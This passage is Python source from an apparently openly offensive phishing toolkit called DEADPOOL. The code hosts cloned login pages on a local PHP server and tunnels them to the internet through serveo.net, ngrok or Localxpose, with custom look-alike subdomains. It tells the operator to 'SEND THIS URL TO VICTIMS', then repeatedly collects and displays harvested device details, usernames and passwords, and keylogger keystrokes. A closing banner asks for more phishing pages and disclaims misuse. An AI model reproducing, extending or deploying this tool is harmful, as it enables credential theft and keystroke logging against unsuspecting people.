    system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
    system("cd Server/www/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &" % (port))
    system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > link.url 2> /dev/null &' % (lnk, port))
    sleep(2)
    try:
        output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
        url = output.decode("utf-8")
        system('clear')
        s_banner()
        print("\n\t{2}press enter.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        #print("\n\n{5}-------------------------------\n{0}[{2} CUSTOM SERVEO URL !!{0}] \n{5}-------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
        #print("\n{0}[{2}!{0}] {2}SEND THIS SERVEO URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}SERVEO URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, port) + url)
        #print("\n")

    except CalledProcessError:
        print('''\n\n{0}FAILED TO GET THIS DOMAIN. !!!\n\nLOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n{0}[{2}!{0}]TRY TO SELECT ANOTHER CUSTOM DOMAIN (GOING BACK).. !! \n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
        sleep(2)
        system('clear')
        return customServeo(port)

def randomServeo(port):
    system('clear')
    s_banner()
    #runServer(port)
    print("\n\n{5}-------------------------------\n{0}[{2} RANDOM SERVEO URL !!{0}] \n{5}-------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
    system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
    system("cd Server/www/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &" % (port))
    system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > link.url 2> /dev/null &' % (port))
    sleep(2)
    try:
        output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
        url = output.decode("utf-8")
        print("\n\t{2}press enter.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        #print("\n{0}[{2}!{0}]{2} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}]{2} SERVEO URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, port) + url )
        print("\n")
    except CalledProcessError:
        sleep(2)
        system('clear')
        return randomServeo(port)

########################################################################################################################################################################################################

def customLocalxpose(port):

    s_banner()
    print("\n\n{5}-------------------------------\n{0}[{2} CREATE A CUSTOM URL HERE !!{0}] \n{5}-------------------------------\n\n{0}[{2}!{0}] {2}YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}[{2}*{0}]{2}Insert a custom subdomain for Localxpose{5}({0}Ex: {2}mysubdomain{5}){4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    lnk = input("\n{0}CUSTOM Subdomain---> {2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
    system("cd Server/www/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &" % (port))
    system('./Server/loclx tunnel http --to :%s --subdomain %s > link.url 2> /dev/null &' % (port, lnk))
    sleep(1)
    print("hi1")
    try:
        output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
        print("hi2")
        url = output.decode("utf-8")
        system('clear')
        s_banner()
        print("\n\t{2}press enter.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        #print("\n\n-------------------------------\n[ CUSTOM SERVEO URL ]{1}!! \n-------------------------------")
        #print("\n{0}[{2}!{0}]{2} SEND THIS LOCALXPOSE URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}LOCALXPOSE URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )
        #print("\n")

    except CalledProcessError:
        print("\n\n{0}FAILED TO GET THIS DOMAIN. !!!\n\nLOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n {0}[{2}!{0}]{0}TRY TO SELECT ANOTHER CUSTOM DOMAIN (GOING BACK).. !! \n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        sleep(4)
        system('clear')
        return customLocalxpose(port)


def randomLocalxpose(port):
    runServer(port)
    #system('clear')
    s_banner()
    print("\n\n{5}-------------------------------\n{0}[ {2}RANDOM LOCALXPOSE URL !!{0}] \n{5}-------------------------------{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
    system("cd Server/www/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &" % (port))
    system('./Server/loclx tunnel http --to :%s > link.url 2> /dev/null &' % (port))
    sleep(1)
    #print("hi1")
    try:
        output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
        print("hi2")
        url = output.decode('utf-8')
        print("\n\t{2}press enter.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        #print("\n{0}[{2}!{0}]{2} SEND THIS LOCALXPOSE URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}]{2} LOCALXPOSE URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )
        #print("\n")
        sleep(1)
    except CalledProcessError:
        sleep(1)
        system('clear')
        return randomLocalxpose(port)


########################################################################################################################################################################################################

def selectServer(port):
    system('clear')
    s_banner()
    print("\n{0}[{2}*{0}]{2}Select Any Available Server:".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\n {0}[{2}0{0}]{2}LOCALHOST \n {0}[{2}1{0}]{2}Ngrok\n {0}[{2}2{0}]{2}Serveo {5}({0}Currently DOWN{5})\n {0}[{2}3{0}]{2}Localxpose".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    global choice
    choice = input(" {0}\nDEADPOOL ---> {2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    if choice == '0':
        system('clear')
        runLocalhost(port)
    elif choice == '1':
        system('clear')
        runNgrok(port)
    elif choice == '2':
        system('clear')
        s_banner()
        print("\n\n{5}-------------------------------\n{0}[{2} LOCALXPOSE URL TYPE SELECTION !!{0}] \n{5}-------------------------------{4}\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        print("\n{0}[{2}*{0}]{2}CHOOSE ANY LOCALXPOSE URL TYPE TO GENERATE PHISHING LINK:".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        print("\n{0}[{2}1{0}]{2}Custom URL {5}({2}Generates designed url{5}) \n{0}[{2}2{0}]{2}Random URL {5}({2}Generates Random url{5}){4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        global inchoice
        inchoice = input("\n\n{0}YOUR CHOICE ---> {2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        system('clear')
        if inchoice == '1':
            customServeo(port)
        elif inchoice == '2':
            randomServeo(port)
        else:
            system('clear')
            print("{0}[{2}!{0}]{2} Invalid option!".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    elif choice == '3':
        system('chmod 777 ./Server/loclx')
        system('clear')
        s_banner()
        print("\n\n{5}-------------------------------\n{0}[{2} LOCALXPOSE URL TYPE SELECTION !!{0}] \n{5}-------------------------------{4}\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        print("\n{0}[{2}*{0}]{2}CHOOSE ANY LOCALXPOSE URL TYPE TO GENERATE PHISHING LINK:".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        print("\n{0}[{2}1{0}]{2}Custom URL {5}({2}Generates designed url{5}) \n{0}[{2}2{0}]{2}Random URL {5}({2}Generates Random url{5}){4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        global ichoice
        ichoice = input("\n\n{0}YOUR CHOICE ---> {2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        system('clear')
        if ichoice == '1':
            customLocalxpose(port)
        elif ichoice == '2':
            randomLocalxpose(port)
        else:
            system('clear')
            return runLocalxpose(port)
    else:
        system('clear')
        return selectServer(port)    
########################################################################################################################################################################################################

def getCredentials(port):
    sleep(0.2)
    s_banner()
    urlFile = open('link.url', 'r')
    url = urlFile.read()
    urlFile.close()
    if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
        link=url
    else:     
        output=subprocess.check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
        url = output.decode("utf-8")
        link=url
        
    if choice == '0':
        name = 'LOCALHOST'
    elif choice == '1':
        name = 'NGROK'
    elif choice == '2' and inchoice == '1':
        name = 'CUSTOM SERVEO'
    elif choice == '2' and inchoice == '2':
        name = 'RANDOM SERVEO'
    elif choice == '3' and ichoice == '1':
        name = 'CUSTOM LOCALXPOSE'
    elif choice == '3' and ichoice == '2':
        name = 'RANDOM LOCALXPOSE'
    print("{5}-------------------------------\n{0}[ {2}CUSTOM {1} URL !!{0}] \n{5}-------------------------------{4}".format(RED, name, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\n{0}[{2}!{0}]{2} SEND THIS {1} URL TO VICTIMS-\n{0}[{2}*{0}]{2} {1} URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}{1} URL: ".format(RED,name,CYAN,GREEN,DEFAULT,YELLOW,port) + link )
    print("{0}[{2}*{0}]{2} Waiting For Victim Interaction. Keep Eyes On Requests Coming From Victim ... \n{5}________________________________________________________________________________".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("{5}\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++{0}\n\t[{2}IF U WANT TO REFRESH THE DATA TAP ENTER{0}]\n\t{0}[{2}       IF U WANT TO EXIT ENTER {6}X        {0}]\n{5}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,GREEN2))
    while True:
        with open('Server/www/ip.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                print('\n {0}[{2} DEVICE DETAILS FOUND {0}]{2}:\n {7}{6}{4}'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,lines,GREEN2))
                system('touch Server/CapturedData/ip.txt && cat Server/www/ip.txt >> Server/CapturedData/ip.txt')# && cp Server/CapturedData/ip.txt 

        creds.close()
        with open('Server/www/usernames.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                print('\n {0}[{2} CREDENTIALS FOUND {0}]{2}:\n {7}{6}{4}'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,lines,GREEN2))
                system("touch Server/CapturedData/usernames.txt && cat Server/www/usernames.txt >> Server/CapturedData/usernames.txt")# && cp Server/CapturedData/usernames.txt 

        with open('Server/www/KeyloggerData.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                #writeLog('{5}...............................'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
                print(' {0}[{2} GETTING PRESSED KEYS {0}]{2}:\n {7}{6}{4}'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,lines,GREEN2))
                system('touch Server/CapturedData/KeyloggerData.txt && cat Server/www/KeyloggerData.txt >> Server/CapturedData/KeyloggerData.txt')# && cp Server/CapturedData/KeyloggerData.txt 
                #writeLog('{5}...............................'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))

        creds.close()
        ans=input("{0}DEADPOOL ---> {2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,lines,GREEN2)).upper()
        if (ans == "X"):
            system('clear')            
            print('''
                  {0}DEADPOOL {5}BY: {0}404-ghost
       {0}[[{2}*{0}]] {6}IF YOU LIKE THIS TOOL, THEN PLEASE HELP TO BECOME BETTER.
  
     {0}[[{2}!{0}]] {6}PLEASE LET US KNOW , IF ANY PHISHING PAGE GOT BROKEN .
     {0}[[{2}!{0}]] {6}MAKE PULL REQUEST, LET US KNOW YOU SUPPORT US.
     {0}[[{2}!{0}]] {6}IF YOU HAVE MORE PHISHING PAGES, THEN JUST MAKE A PULL REQUEST.
     {0}[[{2}!{0}]] {6}PLEASE DON'T HARM ANYONE , ITS ONLY FOR EDUCATIONAL PURPOSE.
     {0}[[{2}!{0}]] {6}WE WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS TOOL
     {0}[[{2}!{0}]] {6}THANKS FOR USE THIS TOOL. {0}"HAPPY HACKING ... GOOD BYE" \n '''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,GREEN2))
            exit()
        else:
            system('clear')
            getCredentials(port)
            #ref=ref+1
checkwget()
checkPHP()
checkNgrok()
checkLocalxpose()
menu_q()
banner()
listpage()
keyloggerprompt()
cloudfarePrompt()
inputCustom()
port = selectPort()
#runServer(port)
selectServer(port)
multiprocessing.Process(target=runServer, args=(port,)).start()
getCredentials(port)


